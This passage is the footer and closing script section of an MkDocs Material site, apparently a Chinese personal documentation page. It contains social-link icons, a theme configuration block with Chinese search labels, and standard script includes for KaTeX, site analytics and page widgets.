      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://space.bilibili.com/27109929" target="_blank" rel="noopener" title="space.bilibili.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M488.6 104.1c16.7 18.1 24.4 39.7 23.3 65.7v202.4c-.4 26.4-9.2 48.1-26.5 65.1-17.2 17-39.1 25.9-65.5 26.7H92c-26.4-.8-48.2-9.8-65.3-27.2S.7 396.5 0 368.2V169.8c.8-26 9.7-47.6 26.7-65.7C43.8 87.8 65.5 78.8 92 78h29.4L96 52.2c-5.7-5.7-8.6-13-8.6-21.8S90.3 14.3 96 8.6 109 0 117.9 0s16.1 2.9 21.9 8.6L213.1 78h88l74.5-69.4C381.7 2.9 389.2 0 398 0s16.1 2.9 21.9 8.6c5.7 5.7 8.6 13 8.6 21.8s-2.9 16.1-8.6 21.8L394.6 78h29.3c26.4.8 48 9.8 64.7 26.1m-38.8 69.7c-.4-9.6-3.7-17.4-10.7-23.5-5.2-6.1-14-9.4-22.7-9.8H96c-9.6.4-17.4 3.7-23.6 9.8-6.1 6.1-9.4 13.9-9.8 23.5v194.4c0 9.2 3.3 17 9.8 23.5s14.4 9.8 23.6 9.8h320.4c9.2 0 17-3.3 23.3-9.8s9.7-14.3 10.1-23.5zm-264.3 42.7c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2-6.2 6.3-14 9.5-23.6 9.5s-17.5-3.2-23.6-9.5-9.4-14-9.8-23.2v-33.3c.4-9.1 3.8-16.9 10.1-23.2s13.2-9.6 23.3-10c9.2.4 17 3.7 23.3 10m191.5 0c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2s-14 9.5-23.6 9.5-17.4-3.2-23.6-9.5c-7-6.3-9.4-14-9.7-23.2v-33.3c.3-9.1 3.7-16.9 10-23.2s14.1-9.6 23.3-10c9.2.4 17 3.7 23.3 10"/></svg>
    </a>
  
    
    
    
    
    <a href="mailto:<probiuslinx@gmail.com>" target="_blank" rel="noopener" title="" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M536.4-26.3c9.8-3.5 20.6-1 28 6.3s9.8 18.2 6.3 28l-178 496.9c-5 13.9-18.1 23.1-32.8 23.1-14.2 0-27-8.6-32.3-21.7l-64.2-158c-4.5-11-2.5-23.6 5.2-32.6l94.5-112.4c5.1-6.1 4.7-15-.9-20.6s-14.6-6-20.6-.9l-112.4 94.3c-9.1 7.6-21.6 9.6-32.6 5.2L38.1 216.8c-13.1-5.3-21.7-18.1-21.7-32.3 0-14.7 9.2-27.8 23.1-32.8z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tabs.link", "content.tooltips", "navigation.indexes", "navigation.instant", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
        <script src="../../javascripts/baidu_SEO.js"></script>
      
        <script src="../../javascripts/katex.js"></script>
      
        <script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.16.8/katex.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js"></script>
      
        <script src="../../javascripts/statis.js"></script>
      
        <script src="../../javascripts/bannerSlider.js"></script>
      
        <script src="../../javascripts/FullCalendar.js"></script>
      
    
  </body>
</html>